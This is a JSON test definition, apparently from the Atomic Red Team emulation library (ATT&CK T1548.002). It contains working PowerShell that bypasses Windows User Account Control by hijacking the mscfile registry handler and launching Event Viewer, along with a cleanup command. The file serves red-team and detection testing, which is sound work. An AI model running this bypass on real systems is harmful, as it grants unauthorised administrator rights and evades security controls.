@@ -1,0 +1,31 @@
+{
+    "name": "Bypass UAC using Event Viewer (PowerShell)",
+    "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ Upon execution command prompt should be launched with administrative privalages ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
+        "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1548.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Bypass User Account Control",
+    "source": "ART",
+    "uuid": "a6ce9acf-842a-4af6-8f79-539be7608e2b",
+    "arguments": {
+        "executable_binary": {
+            "description": "Binary to execute with UAC Bypass",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
